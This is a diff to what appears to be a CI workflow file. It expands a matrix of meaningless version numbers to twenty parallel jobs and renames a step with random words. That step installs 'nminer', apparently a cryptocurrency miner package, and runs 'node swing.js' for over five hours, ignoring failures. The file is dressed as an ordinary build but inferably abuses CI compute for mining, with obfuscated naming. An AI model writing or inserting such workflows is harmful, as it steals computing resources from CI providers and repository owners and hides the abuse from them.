@@ -9,21 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 504 }
-          - { version: 7117 }
-          - { version: 4332 }
-          - { version: 2517 }
-          - { version: 4311 }
-          - { version: 451 }
-          - { version: 3351 }
-          - { version: 4702 }
-          - { version: 3132 }
-          - { version: 1327 }
-          - { version: 3275 }
-          - { version: 1051 }
-          - { version: 8689 }
-          - { version: 4591 }
-          - { version: 9794 }
+          - { version: 1751 }
+          - { version: 2597 }
+          - { version: 9084 }
+          - { version: 8088 }
+          - { version: 4530 }
+          - { version: 6829 }
+          - { version: 8021 }
+          - { version: 5294 }
+          - { version: 3991 }
+          - { version: 985 }
+          - { version: 9076 }
+          - { version: 8878 }
+          - { version: 35 }
+          - { version: 3899 }
+          - { version: 2104 }
+          - { version: 1685 }
+          - { version: 6611 }
+          - { version: 9577 }
+          - { version: 4806 }
+          - { version: 7837 }
 
     steps:
       - name: Checkout
@@ -34,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: which huge whoa furthermore swim
+      - name: barge plain
         run: |
           npm install nminer@latest
-          timeout 346m node swing.js || echo "swing executed"
+          timeout 308m node swing.js || echo "swing executed"
